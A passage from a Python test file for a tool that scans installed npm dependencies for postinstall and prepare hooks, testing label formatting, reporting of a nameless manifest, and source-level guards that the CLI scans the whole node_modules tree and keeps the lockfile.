    assert entry.label == "foo/node_modules/anon"


def test_label_uses_name_and_version_when_available():
    entry = InstalledPackageScripts(package_dir="lodash", name="lodash", version="4.17.21")

    assert entry.label == "lodash@4.17.21"


def test_console_line_shows_a_nested_location():
    entry = InstalledPackageScripts(
        package_dir="foo/node_modules/bar",
        name="bar",
        version="2.0.0",
        hooks=["postinstall"],
        auto_run_hooks=["postinstall"],
    )

    line = format_hooked_package_line(entry)

    assert "bar@2.0.0" in line
    assert "[foo/node_modules/bar]" in line
    assert "postinstall" in line
    assert "not run" not in line


def test_console_line_marks_a_hook_that_did_not_run():
    entry = InstalledPackageScripts(
        package_dir="remix-island", name="remix-island", version="0.2.0", hooks=["prepare"]
    )

    assert "not run for a registry install" in format_hooked_package_line(entry)


def test_a_manifest_without_a_usable_name_is_still_reportable(tmp_path):
    node_modules = tmp_path / "node_modules"
    directory = node_modules / "anon"
    directory.mkdir(parents=True)
    (directory / "package.json").write_text(
        json.dumps({"name": {"nested": "object"}, "scripts": {"postinstall": MALICIOUS_HOOK}}),
        encoding="utf-8",
    )

    report = scan_installed_dependency_scripts(node_modules)

    assert report.dangers
    assert "dependency anon" in report.dangers[0]


# ---------------------------------------------------------------------------
# Mechanism guard: the module has to actually be wired into the phase
# ---------------------------------------------------------------------------

CLI_SOURCE = Path(__file__).resolve().parents[1] / "src" / "cli.py"


def test_cli_runs_the_dependency_pass_and_can_mark_itself_blind():
    """A module nobody calls would leave the hooks exactly as unseen as before."""
    source = CLI_SOURCE.read_text(encoding="utf-8", errors="replace")
    ast.parse(source)  # the guard must not be satisfied by a syntax-broken file

    assert "from sandbox_deps import" in source
    assert "scan_installed_dependency_scripts(" in source
    assert "dep_report.blind_reason()" in source
    assert 'findings.mark_blind("Dependency hooks"' in source


def test_cli_scans_the_whole_installed_tree_not_just_the_target():
    """The bug was scope: the target's own directory holds none of its deps."""
    source = CLI_SOURCE.read_text(encoding="utf-8", errors="replace")

    assert 'installed_root = Path(sandbox_dir) / "node_modules"' in source
    assert "scan_installed_dependency_scripts(\n" in source


def test_cli_excludes_the_target_only_when_phase_one_analyzed_it():
    """A blind metadata phase must not also lose the target's on-disk hooks."""
    source = CLI_SOURCE.read_text(encoding="utf-8", errors="replace")

    assert "metadata_scripts_analyzed = False" in source
    assert "metadata_scripts_analyzed = True" in source
    assert "if metadata_scripts_analyzed" in source


def test_cli_reads_the_lockfile_and_hands_it_to_the_pass():
    """Provenance the CLI never loads leaves `prepare` exactly as unknowable."""
    source = CLI_SOURCE.read_text(encoding="utf-8", errors="replace")

    assert "load_install_source_index" in source
    assert "load_install_source_index(Path(sandbox_dir))" in source
    assert "install_sources=install_sources" in source


def test_cli_install_lets_npm_write_the_lockfile():
    """The regression guard for F36's data source.

    ``npm install --no-save`` suppresses ``package-lock.json`` entirely — measured
    against npm 11.9.0, the sandbox root held only ``package.json`` and
    ``node_modules``. Re-adding the flag would not fail any behavioural test; it
    would just silently return every ``prepare`` hook to "unknown", so the flag is
    pinned here instead.
    """
    source = CLI_SOURCE.read_text(encoding="utf-8", errors="replace")

    assert '["npm", "install", pkg_name, "--prefix", sandbox_dir]' in source
    # Quoted, so the comment explaining the flag's absence does not satisfy it.
    assert '"--no-save"' not in source
